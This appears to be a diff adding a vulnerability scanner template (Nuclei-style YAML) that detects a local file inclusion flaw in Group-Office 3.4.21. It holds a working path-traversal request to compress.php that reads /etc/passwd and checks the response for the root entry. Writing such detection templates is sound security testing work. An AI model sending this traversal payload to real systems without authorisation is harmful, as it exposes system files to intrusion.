@@ -1,0 +1,32 @@
+http:
+    - matchers:
+        - regex:
+            - root:[x*]:0:0
+          type: regex
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/compress.php?file=../../../../../../../etc/passwd'
+id: groupoffice-lfi
+info:
+    author: 0x_Akoko
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+        cvss-score: 7.5
+        cwe-id: CWE-22
+    description: Groupoffice 3.4.21 is vulnerable to local file inclusion.
+    metadata:
+        max-request: 1
+    name: Groupoffice 3.4.21 - Local File Inclusion
+    reference:
+        - https://cxsecurity.com/issue/WLB-2018020249
+        - http://www.group-office.com
+    severity: high
+    tags:
+        - groupoffice
+        - traversal
+        - group-office
+        - Group-Office
